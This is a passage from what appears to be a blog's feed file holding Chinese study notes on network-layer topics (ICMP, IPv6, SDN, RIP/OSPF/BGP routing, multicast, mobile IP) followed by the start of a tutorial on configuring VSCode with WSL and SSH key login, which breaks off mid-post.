src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309001638857.png" alt="image-20240309001638857"></p><p><strong>不发送ICMP差错报文的情况</strong></p><ol><li><p>对ICMP差错报告报文不再发送ICMP差错报告报文。</p></li><li><p>对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文。</p></li><li><p>对具有组播地址的数据报都不发送ICMP差错报告报文(组播地址区别于广播地址，一点到多点即可，只用给部分节点发送，而不像广播地址发送给所有节点)。</p></li><li><p>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文。</p></li></ol><h2 id="ICMP询问报文"><a href="#ICMP询问报文" class="headerlink" title="ICMP询问报文"></a>ICMP询问报文</h2><ol><li><p>回送请求和回答报文：主机或路由器向特定目的主机发出的询问，收到此报文的主机必须给源主机或路由器发送ICMP回送回答报文。测试目的站是否可达以及了解其相关状态。(平时用的ping命令就是一种)</p></li><li><p>时间戳请求和回答报文：请某个主机或路由器回答当前的日期和时间。用来进行时钟同步和测量时间。2.时间戳请求和回答报文</p></li><li><p>掩码地址请求和回答报文</p></li><li><p>路由器询问和通告报文</p></li></ol><blockquote><p>第三和第四种现在已经不再使用了</p></blockquote><h2 id="ICMP的应用"><a href="#ICMP的应用" class="headerlink" title="ICMP的应用"></a>ICMP的应用</h2><p>这里介绍两个命令</p><ol><li><p>ping：该命令测试两个主机之间的连通性，使用了ICMP回送请求和回答报文</p></li><li><p>traceroute(Windows上是tracert)：跟踪一个分组从源点到终点的路径，使用了ICMP时间超过差错报告报文</p><p>他的原理是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309002552980.png" alt="image-20240309002552980"></p><p>一开始的报文TTL设置为1，经过一个路由，TTL变为0然后返回差错报告报文，就可以测试出一个路由，此后每次TTL加1，以此类推就可以测出经过多少路由，也就知道了路径。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309003134315.png" alt="image-20240309003134315"></p><blockquote><p>结果说明：第一列表示到达目标服务器经过的网络节点数，2-4列分别表示请求目标节点时间、目标节点响应时间和平均响应时间，最右边则表示到达目标服务器所经过的每个网络节点的IP</p></blockquote></li></ol><h1 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h1><p>因为IPv4的地址空间分配殆尽，所以IPv6就出现了来解决地址空间不足问题。</p><p><strong>IPv6的改变</strong></p><p>改进了首部格式以便快速处理和快速转发。</p><p>支持QoS(Quality of Service，服务质量)：指一个网络能够利用各种基础技术，为指定的网络通信提供更好的服务能力,是网络的一种安全机制，是用来解决网络延迟和阻塞等问题的一种技术。</p><h2 id="数据报格式"><a href="#数据报格式" class="headerlink" title="数据报格式"></a>数据报格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309004131851.png" alt="image-20240309004131851"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309005425608.png" alt="image-20240309005425608"></p><ol><li>这里的版本指明了协议版本，IPv6他的字段值就是6</li><li>优先级就是区分数据报的类别和优先级</li><li>流标签有点类似数据报分片中的标识位，“流”是互联网络上从特定源点到特定终点的一系列数据报。所有属于同一个流的数据报都具有同样的流标签。比如B和A主机进行连接传输数据，在该连接上B向A发出的多个数据包都属于同一个流，所以他们也就有相同的流标签。</li><li>下一个首部顾名思义就是表示下一个首部是谁，比如基本首部的下一个首部标识扩展首部1，扩展首部的下一个首部标识扩展首部2，扩展首部2的下一个首部标识数据部分。</li><li>跳数限制就相当于IPv4的TTL。</li></ol><h2 id="IPv6和IPv4的区别"><a href="#IPv6和IPv4的区别" class="headerlink" title="IPv6和IPv4的区别"></a>IPv6和IPv4的区别</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309010458862.png" alt="image-20240309010458862"></p><blockquote><p>在第七点中，因为在传输过程中不能在路由分片，所以如果超过了数据链路层的最大传输单元MTU就会将数据报丢弃，返回一个ICMPv6差错报文。</p></blockquote><h2 id="IPv6地址表示形式"><a href="#IPv6地址表示形式" class="headerlink" title="IPv6地址表示形式"></a>IPv6地址表示形式</h2><ol><li><p>一般形式：冒号十六进制记法**(八组四位十六进制数)**，比如：4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</p></li><li><p>压缩形式</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309011120976.png" alt="image-20240309011120976"></p></li></ol><h2 id="IPv6基本地址类型"><a href="#IPv6基本地址类型" class="headerlink" title="IPv6基本地址类型"></a>IPv6基本地址类型</h2><ol><li>单播：一对一通信，可做源地址+目的地址</li><li>多播：一对多通信，可做目的地址</li><li>任播：一对多中的一个通信，可做目的地址</li></ol><h2 id="IPv6向IPv4过渡策略"><a href="#IPv6向IPv4过渡策略" class="headerlink" title="IPv6向IPv4过渡策略"></a>IPv6向IPv4过渡策略</h2><ol><li><strong>双栈协议：</strong>双协议栈技术就是指在一台设备上<strong>同时启用IPv4协议栈和IPv6协议栈</strong>。这样的话，这台设备既能和IPv4网络通信，又能和IPv6网络通信。如果这台设备是一个路由器，那么这台路由器的不同接口上，分别配置了IPv4地址和IPv6地址，并很可能分别连接了IPv4网络和IPv6网络。如果这台设备是一个计算机，那么它将同时拥有IPv4地址和IPv6地址，并具备同时处理这两个协议地址的功能。</li><li><strong>隧道技术：</strong>通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送。比如一段IPv6的数据报加上IPv4的首部，而IPv6的数据报则作为数据部分，然后重新封装当作IPv4进行传播。</li></ol><h1 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h1><h2 id="路由转发和路由选择"><a href="#路由转发和路由选择" class="headerlink" title="路由转发和路由选择"></a>路由转发和路由选择</h2><p><strong>转发：</strong></p><p>达到路由器输入链路之一的数据报如何转发到该路由器的输出链路之一。花费时间短，通常用硬件解决</p><p><strong>数据平面</strong></p><p>数据平面对于数据处理过程中各种具体处理转发过程。对应路由转发</p><p><strong>路由选择：</strong></p><p>控制数据报沿着从源主机到目的主机的端到端路径中路由器之间的路由方式。花费时间长，通常用软件解决。</p><p><strong>控制平面</strong></p><p>控制平面用于控制和管理网络协议的运行，比如OSPF协议、RIP协议、BGP协议。对应路由选择。</p><h2 id="数据平面"><a href="#数据平面" class="headerlink" title="数据平面"></a>数据平面</h2><p>数据平面执行的主要功能是根据转发表进行转发，这是路由器的本地动作。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306235123180.png" alt="image-20240306235123180"></p><h2 id="控制平面"><a href="#控制平面" class="headerlink" title="控制平面"></a>控制平面</h2><p><strong>控制平面的传统方法也叫每路由器法：</strong></p><p>路由选择算法运行在每台路由器中，并且在每台路由器中都包含转发和路由选择两种功能。</p><p>具体原理为：在一台路由器中的路由选择算法与其他路由器中的路由选择算法通信(通过交换路由选择报文)<br>计算出路由表和转发表。</p><p><strong>SDN方法：Software-Defined Networking</strong></p><p>控制平面从路由器物理上分离。路由器仅实现转发，远程控制器计算和分发转发表以供每台路由器所使用。</p><p>具体原理为：路由器通过交换包含转发表和其他路由选择信息的报文与远程控制器通信。因为计算转发并与路由器交互的控制器是用软件实现的，所以网络是软件定义的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307093103127.png" alt="image-20240307093103127"></p><p><strong>控制平面中的路由选择处理器</strong></p><p>传统方法：路由选择处理器执行控制平面功能。在传统的路由器中，它执行路由选择协议，维护路由选择表于关联链路状态信息，并为该路由器计算转发表。</p><p>SDN方法：在SDN路由器中，路由选择处理器负责与远程控制器通信，目的是接收远程控制器计算的转发表项。</p><h2 id="SDN组件"><a href="#SDN组件" class="headerlink" title="SDN组件"></a>SDN组件</h2><ul><li><p>SDN控制器：维护准确的网络状态信息(远程链路、交换机和主机的状态);为运行在控制平面中的网络控制应用程序提供这些信息(逻辑集中，在多台服务器上实现)</p></li><li><p>网络控制应用程序：根据SDN控制器提供的方法，这些应用程序通过这些方法能够监视、编程和控制下面的网<br>络设备。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307093843773.png" alt="image-20240307093843773"></p><p><strong>SDN控制器的细节</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307094357878.png" alt="image-20240307094357878"></p><h1 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h1><ul><li><p><strong>静态路由算法(非自适应路由算法)</strong>,</p><p>由管理员手工配置路由信息。<br>简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，广泛用于高度安全性的军事网络和较小的商业网络。路由更新慢，不适用大型网络。</p></li><li><p><strong>动态路由算法(自适应路由算法)</strong></p><p>由路由器间彼此交换信息，按照路由算法优化出路由表项。<br>路由更新快，适用大型网络，及时响应链路费用或网络拓扑变化。<br>算法复杂，增加网络负担。</p><p><strong>动态路由算法又可以分为全局性和分散性</strong></p><ul><li><p>全局性：链路状态路由算法(OSPF)</p><p>所有路由器掌握完整的网络拓扑和链路费用信息。</p></li><li><p>分散性：距离向量路由算法(RIP)</p><p>路由器只掌握物理相连的邻居及链路费用。</p></li></ul></li></ul><h1 id="分层次路由选择协议"><a href="#分层次路由选择协议" class="headerlink" title="分层次路由选择协议"></a>分层次路由选择协议</h1><p>分层协议产生的原因是因为很多单位在接入因特网的同时还要隐藏自己的路由选择协议，这里就涉及到一个自治系统AS的概念</p><p><strong>自治系统AS</strong></p><p>在单一的技术管理下的一组路由器，而这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由，同时还使用一种AS之间的路由协议以确定在AS之间的路由。个AS内的所有网络都属于一个行政单位来管辖，一个自治系统的所有路由器在本自治系统内都必须连通</p><p><strong>路由选择协议又分为两种</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240307125518139.png" alt="image-20240307125518139"></p><blockquote><p>现在常用的是BGP-4</p></blockquote><h1 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议"></a>RIP协议</h1><p><strong>定义</strong></p><p>RIP是一种分布式的基于距离向量的路由选择协议，是因特网的协议标准，最大优点是简单；它适用于小型网络。</p><p><strong>相关规则</strong></p><p>RIP协议要求网络中每一个路由器都维护从它自己到其他每一个目的网络的唯一最佳距离记录(即一组距离)</p><p>&#x3D;&#x3D;距离：&#x3D;&#x3D;通常为“跳数”，即从源端口到目的端口所经过的路由器个数，经过一个路由器跳数+1。特别的，从由器到直接连接的网络距离为1。RIP允许一条路由最多只能包含15个路由器，因此距离为16表示网络不可达<br>一路</p><p>一个示例图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309012809494.png" alt="image-20240309012809494"></p><h2 id="RIP协议交换规则"><a href="#RIP协议交换规则" class="headerlink" title="RIP协议交换规则"></a>RIP协议交换规则</h2><ol><li>仅和相邻路由器交换信息</li><li>路由器交换的信息是自己的路由表</li><li>每30秒交换一次路由信息，然后路由器根据新信息更新路由表。若超过180s没收到邻居路由器的通告，则判定邻居没了，并更新自己路由表。</li></ol><blockquote><p>路由器刚开始工作时，只知道直接连接的网络的距离(距离为1)，接着每一个路由器也只和数目非常有限的相路由器交换并更新路由信息。</p><p>经过若干次更新后，所有路由器最终都会知道到达本自治系统任何一个网络的最短距离和下一跳路由器的地址,即“收敛</p></blockquote><h2 id="距离向量算法"><a href="#距离向量算法" class="headerlink" title="距离向量算法"></a>距离向量算法</h2><ol><li><p>修改相邻路由器发来的RIP报文中所有表项。</p><p>对地址为X的相邻路由器发来的RIP报文，修改此报文中的所有项目：把“下一跳”字段中的地址改为X，并把<br>所有的“距离”字段+1。</p><p>这里用一个演示图解释一下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309013653735.png" alt="image-20240309013653735"></p><p>与x相邻的路由为R1，x就把自己的上图路由表发给R1，原来的路由表表示，到Net3网络的最短路径为2跳，下一跳为R2，R1收到后就直接顺着修改成到Net3的最短路径为3，下一跳为x</p></li><li><p>对修改后的RIP报文中的每一个项目，进行以下步骤：</p><ul><li><p>R1路由表中若没有Net3，则把该项目填入R1路由表。</p></li><li><p>R1路由表中若有Net3，则查看下一跳路由器地址：</p><p>若下一跳是X不管距离大小，则用收到的项目替换源路由表中的项目；</p><p>若下一跳不是X，比较原来距离比从X走的距离远则更新，否则不作处理。</p></li></ul></li><li><p>若180s还没收到相邻路由器X的更新路由表，则把X记为不可达的路由器，即把距离设置为16。</p></li><li><p>返回。</p></li></ol><h2 id="RIP协议报文格式"><a href="#RIP协议报文格式" class="headerlink" title="RIP协议报文格式"></a>RIP协议报文格式</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309015032452.png" alt="image-20240309015032452"></p><h2 id="RIP特点"><a href="#RIP特点" class="headerlink" title="RIP特点"></a>RIP特点</h2><p><img src="C:/Users/86189/AppData/Roaming/Typora/typora-user-images/image-20240309015302320.png" alt="image-20240309015302320"></p><p>要不断重复更新下去，直到双方路由表到网1的距离都更新到16，R1和R2才知道网络1是不可达的。</p><h1 id="OSPF协议"><a href="#OSPF协议" class="headerlink" title="OSPF协议"></a>OSPF协议</h1><p><strong>定义</strong><br>开放最短路径优先OSPF协议:“开放”标明OSPF协议不是受某一家厂商控制，而是公开发表的：”最短路径优先“是因为使用了Diikstra提出的最短路径算法SPF。</p><p>OSPF最主要的特征就是使用分布式的链路状态协议。</p><p><strong>OSPF的特点</strong></p><ol><li>使用洪泛法向自治系统内所有路由器发送信息，即路由器通过输出端口向所有相邻的路由器发送信息，而每一个相邻路由器又再次将此信息发往其所有的相邻路由器；就相当于广播信息出去。最终整个区域内的路由器就得到了这个信息的一个副本。</li><li>发送的信息就是与本路由器相邻的所有路由器的链路状态(本路由器和哪些路由器相邻，以及该链路的度<br>量&#x2F;代价–费用、距离、时延、带宽等)。</li><li>只有当链路状态发生变化时，路由器才向所有路由器洪泛发送此信息。</li></ol><blockquote><p>最后，所有路由器都能建立一个链路状态数据库，即全网拓扑图。</p></blockquote><h2 id="链路状态路由算法"><a href="#链路状态路由算法" class="headerlink" title="链路状态路由算法"></a>链路状态路由算法</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309093424516.png" alt="image-20240309093424516"></p><h2 id="OSPF的区域"><a href="#OSPF的区域" class="headerlink" title="OSPF的区域"></a>OSPF的区域</h2><p> OSPF常用于规模很大的网络，OSPF将一个自治系统再划分为若干个更小的范围，叫做区域；每一个区域都有一个32位的区域标识符(用点分十进制表示)，区域也不能太大，在一个区域内的路由器最好不超过200个。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309093653477.png" alt="image-20240309093653477"></p><blockquote><p>位于主干边界的路由器，比如R3，R4，R7；既属于主干路由器也属于区域边界路由器</p><p>自治系统边界路由器就是与外界连接比如其他AS的路由器。</p></blockquote><h2 id="OSPF分组"><a href="#OSPF分组" class="headerlink" title="OSPF分组"></a>OSPF分组</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309094030723.png" alt="image-20240309094030723"></p><blockquote><p>关于OSPF属于哪一层协议有点争议，判断某个协议属于哪一层：一个协议的实现需要依赖协议所在层次的下一层功能；所以RIP依赖UDP所以是应用层协议。</p><p>而OSPF依赖网络层，属于传输层协议；但是在考研的考纲中，OSPF是不使用UDP数据报传送，而是直接使用IP数据报传送，所以被划分到网络层协议。</p></blockquote><h2 id="其他特点"><a href="#其他特点" class="headerlink" title="其他特点"></a>其他特点</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095051174.png" alt="image-20240309095051174"></p><h1 id="BGP协议"><a href="#BGP协议" class="headerlink" title="BGP协议"></a>BGP协议</h1><p><strong>交换信息的特点</strong></p><ul><li>与其他AS的邻站BGP发言人交换信息。</li><li>交换的网络可达性的信息，即要到达某个网络所要经过的一系列AS。</li><li>发生变化时更新有变化的部分。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095348561.png" alt="image-20240309095348561"></p><blockquote><p>发言人也不一定要是边界路由器，可以自己设定。</p><p>BGP协议交换内容首次为整个路由表，后面则为有变化的部分。</p></blockquote><h2 id="BGP交换信息过程"><a href="#BGP交换信息过程" class="headerlink" title="BGP交换信息过程"></a>BGP交换信息过程</h2><p>BGP 所交换的网络可达性的信息就是要到达某个网络所要经过的一系列 AS。当 BGP 发言人互相交换了网络可<br>性的信息后，各 BGP发言人就根据所采用的策略从收到的路由信息中找出到达各 AS的较好路由。</p><ul><li><p>BGP发言人交换路径向量：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309095956540.png" alt="image-20240309095956540"></p><p>主干网还可发出通知：要到达网络N5、N6和N7可沿路径(AS1,AS3)。</p></li></ul><h2 id="BGP协议报文格式"><a href="#BGP协议报文格式" class="headerlink" title="BGP协议报文格式"></a>BGP协议报文格式</h2><p>一个BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，即通过TCP传送，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309100149532.png" alt="image-20240309100149532"></p><h2 id="BGP协议特点"><a href="#BGP协议特点" class="headerlink" title="BGP协议特点"></a>BGP协议特点</h2><p>BGP 支持 CIDR，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列。</p><p>在 BGP 刚刚运行时，BGP的邻站是交换整个的 BGP路由表。但以后只需要在发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处。</p><h2 id="BGP-4的四种报文"><a href="#BGP-4的四种报文" class="headerlink" title="BGP-4的四种报文"></a>BGP-4的四种报文</h2><ol><li><p><strong>OPEN(打开)报文：</strong>用来与相邻的另一个BGP发言人建立关系，并认证发送方。</p></li><li><p><strong>UPDATE(更新)报文：</strong>通告新路径或撤销原路径。</p></li><li><p><strong>KEEPALIVE(保活)报文：</strong>在无UPDATE时，周期性证实邻站的连通性；也作为OPEN的确认。</p></li><li><p><strong>NOTIFICATION(通知)报文：</strong>报告先前报文的差错;也被用于关闭连接。</p></li></ol><h1 id="三种路由协议的比较"><a href="#三种路由协议的比较" class="headerlink" title="三种路由协议的比较"></a>三种路由协议的比较</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309100705696.png" alt="image-20240309100705696"></p><h1 id="IP组播"><a href="#IP组播" class="headerlink" title="IP组播"></a>IP组播</h1><h2 id="IP数据报的三种传输方式"><a href="#IP数据报的三种传输方式" class="headerlink" title="IP数据报的三种传输方式"></a>IP数据报的三种传输方式</h2><ol><li><strong>单播：</strong>单播用于发送数据包到单个目的地，且每发送一份单播报文都使用一个单播IP地址作为目的地址。是一种点对点传输方式。</li><li><strong>广播：</strong>广播是指发送数据包到同一广播域或子网内的所有设备的一种数据传输方式，是一种点对多点传输方式。</li><li><strong>组播(多播)：</strong>当网络中的某些用户需要特定数据时，组播数据发送者仅发送一次数据，借助组播路由协议为组播数据包建立组播分发树，被传递的数据到达距离用户端尽可能近的节点后才开始复制和分发，是一种点对多点传输方式。</li></ol><p>组播提高了数据传送效率。减少了主干网出现拥塞的可能性。组播组中的主机可以是在同一个物理网络，也可以来自不同的物理网络(如果有组播路由器的支持也就是运行组播协议的路由器)。</p><p>以一个发送视频数据的图例来解释：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309101432054.png" alt="image-20240309101432054"></p><p>组播在每条链路上只有一份数据，大大降低网络拥塞的可能；如果是单播传输的话，服务器就要复制90份数据然后进行分发，链路上就会出现90份数据，网络拥塞程度就会上升。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309101706544.png" alt="image-20240309101706544"></p><h2 id="IP组播地址"><a href="#IP组播地址" class="headerlink" title="IP组播地址"></a>IP组播地址</h2><p>IP组播地址让源设备能够将分组发送给一组设备。属于多播组的设备将被分配一个组播组IP地址(一群共同需求<br>主机的相同标识)。</p><p>组播地址范围为224.0.0.0~239.255.255.255(D类地址)，一个D类地址表示一个组播组。组播地址只能用作分组的目标地址。源地址总是为单播地址。</p><p><strong>组播数据报特点</strong></p><ol><li><p>组播数据报也是“尽最大努力交付”，不提供可靠交付，应用于UDP</p></li><li><p>对组播数据报不产生ICMP差错报文。</p></li><li><p>并非所有D类地址都可以作为组播地址。</p></li></ol><h2 id="硬件组播"><a href="#硬件组播" class="headerlink" title="硬件组播"></a>硬件组播</h2><p>在上面的视频传输的例子中，又有<strong>因特网范围内组播</strong>和<strong>硬件组播</strong>。</p><p>硬件组播是在局域网内进行组播；因特网组播则是还未进入局域网时组播。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309103003239.png" alt="image-20240309103003239"></p><h2 id="IGMP协议与组播路由选择协议"><a href="#IGMP协议与组播路由选择协议" class="headerlink" title="IGMP协议与组播路由选择协议"></a>IGMP协议与组播路由选择协议</h2><h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p>也叫网际组管理协议</p><p><strong>IGMP协议工作的两个阶段</strong></p><ol><li><p>某主机要加入组播组时，该主机向组播组的组播地址发送一个IGMP报文，声明自己要称为该组的成员。本地组播路由器收到IGMP报文后，要利用组播路由选择协议把这组成员关系发给因特网上的其他组播路由器。</p></li><li><p>本地组播路由器周期性探询本地局域网上的主机，以便知道这些主机是否还是组播组的成员。</p><p>只要有一个主机对某个组响应，那么组播路由器就认为这个组是活跃的；如果经过几次探询后没有一个主机响应，组播路由器就认为本网络上的没有此组播组的主机，因此就不再把这组的成员关系发给其他的组播路由器。</p></li></ol><blockquote><p>组播路由器知道的成员关系只是所连接的局域网中有无组播组的成员。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309103754389.png" alt="image-20240309103754389"></p><h3 id="组播路由选择协议"><a href="#组播路由选择协议" class="headerlink" title="组播路由选择协议"></a>组播路由选择协议</h3><p>组播路由选择协议目的是找出以源主机为根节点的组播转发树。</p><p>对不同的多播组对应于不同的多播转发树；同一个多播组，对不同的源点也会有不同的多播转发树。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309104118961.png" alt="image-20240309104118961"></p><p><strong>常用的三种算法</strong></p><ol><li><p>基于链路状态的路由选择</p></li><li><p>基于距离-向量的路由选择</p></li><li><p>协议无关的组播(稀疏&#x2F;密集)</p><p>组播组中的主机比较分散就用稀疏算法；较为密集就用密集算法。</p></li></ol><blockquote><p>第一第二种都在前面有说过。</p></blockquote><h1 id="移动IP"><a href="#移动IP" class="headerlink" title="移动IP"></a>移动IP</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>移动IP技术是移动结点(计算机&#x2F;服务器等)以固定的网络IP地址，实现跨越不同网段的漫游功能，并保证了基于网络IP的网络权限在漫游过程中不发生任何改变。</p><p><strong>移动结点</strong> 具有永久IP地址的移动设备。</p><p><strong>归属代理(本地代理)</strong> 一个移动结点的永久“居所”称为归属网络，在归属网络中代表移动节点执行移动管理功能的实体叫做归属代理。</p><p><strong>永久地址(归属地址&#x2F;主地址)</strong> 移动站点在归属网络中的原始地址。</p><p><strong>外部代理(外地代理)</strong> 在外部网络中帮助移动节点完成移动管理功能的实体称为外部代理。</p><p><strong>转交地址(辅地址)</strong> 可以是外部代理的地址或动态配置的一个地址。</p><h2 id="移动IP通信过程"><a href="#移动IP通信过程" class="headerlink" title="移动IP通信过程"></a>移动IP通信过程</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105307481.png" alt="image-20240309105307481"></p><h1 id="网络层设备"><a href="#网络层设备" class="headerlink" title="网络层设备"></a>网络层设备</h1><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>路由器是一种具有多个输入端口和输出端口的专用计算机，其任务是转发分组。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105633658.png" alt="image-20240309105633658"></p><p><strong>输入端口的处理</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105754630.png" alt="image-20240309105754630"></p><p><strong>输出端口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309105909980.png" alt="image-20240309105909980"></p><h2 id="三层设备的区别"><a href="#三层设备的区别" class="headerlink" title="三层设备的区别"></a>三层设备的区别</h2><p><strong>路由器</strong> 可以互联两个不同网络层协议的网段。</p><p><strong>网桥</strong> 可以互联两个物理层和链路层不同的网段。</p><p><strong>集线器</strong> 不能互联两个物理层不同的网段</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309110212888.png" alt="image-20240309110212888"></p><h2 id="路由表与路由转发"><a href="#路由表与路由转发" class="headerlink" title="路由表与路由转发"></a>路由表与路由转发</h2><p>路由表根据路由选择算法得出的，主要用途是路由选择，总用软件来实现</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240309110538681.png" alt="image-20240309110538681"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode配置Linux开发环境</title>
      <link href="/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="VSCode配置wsl开发环境"><a href="#VSCode配置wsl开发环境" class="headerlink" title="VSCode配置wsl开发环境"></a>VSCode配置wsl开发环境</h1><p>在vscode上使用wsl进行开发环境就比较简单，我这里用的是Ubuntu的wsl</p><p>首先检查一下wsl里面有没有gcc和g++编译器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">g++ -v<br>gcc -v<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306164855577.png" alt="image-20240306164855577"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306164915530.png" alt="image-20240306164915530"></p><p>如果没有就执行下面命令安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get update #更新软件包列表<br>sudo apt-get install build-essential gdb #安装 GNU 编译器工具和 GDB 调试器<br></code></pre></td></tr></table></figure><p>然后去创建一个项目文件夹，在需要vscode打开的文件夹下输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">code .<br></code></pre></td></tr></table></figure><p>就会自动开启一个vscode</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165346221.png" alt="image-20240306165346221"></p><p>左下角就会显示wsl的连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165411416.png" alt="image-20240306165411416"></p><p>随便写个cpp文件，然后我们在终端就可以进行编译了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306165629607.png" alt="image-20240306165629607"></p><p><strong>从vscode中启动wsl</strong></p><p>只需要安装两个remote扩展就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170459303.png" alt="image-20240306170459303"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170511786.png" alt="image-20240306170511786"></p><p>然后命令输入wsl即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170442810.png" alt="image-20240306170442810"></p><p>如果有多个发行版想要指定的话就选这个</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306170834830.png" alt="image-20240306170834830"></p><blockquote><p>另外不想命令行编译调试的话也可以直接在为wsl安装code runner和c++扩展即可</p></blockquote><h1 id="VSCode配置远程服务器连接"><a href="#VSCode配置远程服务器连接" class="headerlink" title="VSCode配置远程服务器连接"></a>VSCode配置远程服务器连接</h1><p>首先安装好这个插件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205105832.png" alt="image-20240306205105832"></p><p>然后去config文件配置ssh文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205237737.png" alt="image-20240306205237737"></p><p>要先在本机使用如下命令生成密钥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  //一般默认保存在~/.ssh路径下<br></code></pre></td></tr></table></figure><p>然后配置文件如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Host &lt;随便填主机名&gt;<br>HostName &lt;远程主机ip地址&gt;<br>User &lt;登陆用户&gt;<br>IdentityFile &lt;私钥路径&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205426338.png" alt="image-20240306205426338"></p><p>配置好本机ssh文件之后，公钥放在远程主机的~&#x2F;.ssh下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240306205744858.png" alt="image-20240306205744858"></p><p>然后把公钥文件写入authorized_keys里即可完成整个配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat id_rsa_vps.pub &gt;&gt; authorized_keys<br></code></pre></td></tr></table></figure><blockquote><p>公钥私钥是用来进行免密登陆的，也可以不使用，只不过在登陆的时候就要输入密码</p></blockquote><p>然后点击在新窗口连接主机</p><p><img 